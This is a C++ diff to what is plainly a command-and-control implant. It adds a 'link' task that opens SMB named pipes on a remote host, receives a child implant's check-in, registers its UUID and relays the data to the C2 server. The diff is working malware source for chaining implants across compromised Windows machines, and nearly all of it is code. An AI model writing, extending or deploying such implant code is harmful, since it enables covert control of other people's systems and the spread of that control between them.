@@ -31,6 +31,11 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include <string_view>
 #include <windows.h>
 #include <string>
+#include "systems/childhandler.h"
+#include "comms/queues.h"
+#include "core/c2.h"
+#include "comms/smb.h"
+
 //move to own file?
 std::string GetErrorMessage(DWORD dwErrorCode) {
     if (dwErrorCode == ERROR_SUCCESS) {
@@ -244,6 +249,159 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         return result;
     }
 
+    /*
+    Link commands
+    */
+    else if (task_name == "link") {
+        //update link class with info we need
+
+        nlohmann::json result;
+
+        //make sure all of our args are present
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("target") || !args["target"].is_string()) {
+            result["error"] = "Task failed: 'target' is missing or not a string";
+            return result;
+        }
+
+        if (!args.contains("protocol") || !args["protocol"].is_string()) {
+            result["error"] = "Task failed: 'protocol' is missing or not a string";
+            return result;
+        }
+
+        if (!args.contains("inbox_pipe") || !args["inbox_pipe"].is_string()) {
+            result["error"] = "Task failed: 'inbox_pipe' is missing or not a string";
+            return result;
+        }
+
+        if (!args.contains("outbox_pipe") || !args["outbox_pipe"].is_string()) {
+            result["error"] = "Task failed: 'outbox_pipe' is missing or not a string";
+            return result;
+        }
+
+        //host we connect to
+        if (!args.contains("target") || !args["target"].is_string()) {
+            result["error"] = "Task failed: 'target' is missing or not a string";
+            return result;
+        }
+
+        //setup our struct for the childhandler class
+        ChildRouteInfo cri;
+        //cri.target_uuid = args["child_uuid"];
+
+        // Map the protocol string to our internal Enum
+        std::string protocol = args["protocol"];
+        if (protocol == "smb" || protocol == "pipe") {
+            cri.route_type = ROUTE_SMB_PIPE;
+        }
+        //else if (protocol == "tcp") { //not implemented yet
+        //    cri.route_type = ROUTE_TCP_SOCKET; 
+        //}
+        else {
+            result["error"] = "Task failed: Unknown protocol '" + protocol + "'.";
+            return result;
+        }
+
+        // Format the pipe names and convert std::string to std::wstring
+        // Assuming the operator just passes "inbox2", we prepend the Windows pipe path format.
+        //kinda fragile, should probably think about how to take bad pipe name input here
+        //std::string raw_inbox = "\\\\.\\pipe\\" + args["inbox_pipe"].get<std::string>();
+        //std::string raw_outbox = "\\\\.\\pipe\\" + args["outbox_pipe"].get<std::string>();
+        std::string target_host = args["target"];
+        std::string raw_inbox = "\\\\" + target_host + "\\pipe\\" + args["inbox_pipe"].get<std::string>();
+        std::string raw_outbox = "\\\\" + target_host + "\\pipe\\" + args["outbox_pipe"].get<std::string>();
+
+        cri.pipe_inbox = std::wstring(raw_inbox.begin(), raw_inbox.end());
+        cri.pipe_outbox = std::wstring(raw_outbox.begin(), raw_outbox.end());
+        cri.host_address = target_host;
+
+        //poking child
+        if (cri.route_type == ROUTE_SMB_PIPE) {
+            std::cout << "[*] Waiting for connection from child" << std::endl;
+
+            // quickly connect to pipes
+            HANDLE h_parent_write = CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+            HANDLE h_parent_read = CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+            if (h_parent_write != INVALID_HANDLE_VALUE && h_parent_read != INVALID_HANDLE_VALUE) {
+                std::cout << "[*] Pipes connected. Waiting for child to check in..." << std::endl;
+                cri.h_pipe_inbox = h_parent_write;
+                cri.h_pipe_outbox = h_parent_read;
+
+                // CRITICAL: Force the read handle into Message Mode so MsgPack doesn't fragment
+                DWORD mode = PIPE_READMODE_MESSAGE;
+                if (!SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
+                    std::cerr << "[-] Failed to set pipe to message mode. Error: " << GetLastError() << std::endl;
+                }
+
+                // Use our new dynamic reader!
+                std::vector<uint8_t> request_bytes;
+                DWORD read_status = SMB::read_pipe_dynamic(cri.h_pipe_outbox, request_bytes);
+
+                if (read_status != ERROR_SUCCESS || request_bytes.empty()) {
+                    std::cout << "[-] Pipe broke or child disconnected. Error: " << read_status << std::endl;
+                    result["error"] = "Pipe broke or child disconnected";
+                    return result;
+                }
+
+                try {
+                    // It is an ARRAY!
+                    nlohmann::json child_request_array = nlohmann::json::from_msgpack(request_bytes);
+
+                    if (!child_request_array.is_array() || child_request_array.empty()) {
+                        throw std::runtime_error("Child sent empty or invalid array format.");
+                    }
+
+                    // Grab the actual check-in object from the array
+                    nlohmann::json child_request = child_request_array[0];
+                    std::string child_uuid = child_request["implant_uuid"];
+
+                    // Add uuid to cri and register to child handler
+                    cri.child_uuid = child_uuid;
+                    ChildHandler::instance().add_child(child_uuid, cri);
+
+                    // Push the whole array to the GET queue
+                    //GetQueue::push(child_request_array);
+                    //take all items from child (should just be metadata) and send them back up
+                    for (const auto& item : child_request_array) {
+                        GetQueue::push(item);
+                    }
+
+                    // Immediatly feed it a nothingburger task to "reset" it back to sending a GET
+                    nlohmann::json task_list = nlohmann::json::array();
+                    std::vector<uint8_t> msgpack_payload = nlohmann::json::to_msgpack(task_list);
+
+                    DWORD bytes_written = 0;
+                    WriteFile(cri.h_pipe_inbox, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);
+
+                }
+                catch (const std::exception& e) {
+                    std::cerr << "[-] Exception during link: " << e.what() << std::endl;
+                    result["error"] = "Something went wrong linking to the implant";
+                    return result;
+                }
+            }
+            else {
+                //for invliad handels, i.e. bad perms, etc.
+                int windows_error_code = GetLastError();
+                result["message"] = GetErrorMessage(windows_error_code);
+                result["windows_error_code"] = windows_error_code;
+                return result;
+            }
+            // Return success back to the C2 server
+            result["data"]["child_uuid"] = cri.child_uuid;
+            result["message"] = "Successfully linked to child implant " + protocol + ".";
+            result["windows_error_code"] = 0; // ERROR_SUCCESS
+            return result;
+        }
+    }
+    //else if (task_name == "unlink") {
+    //    //Delete link info from class & disconnect
+
+    //}
+    /*
+    Memstore commands
+    */
     else if (task_name == "memstore upload") {
         nlohmann::json result;
 
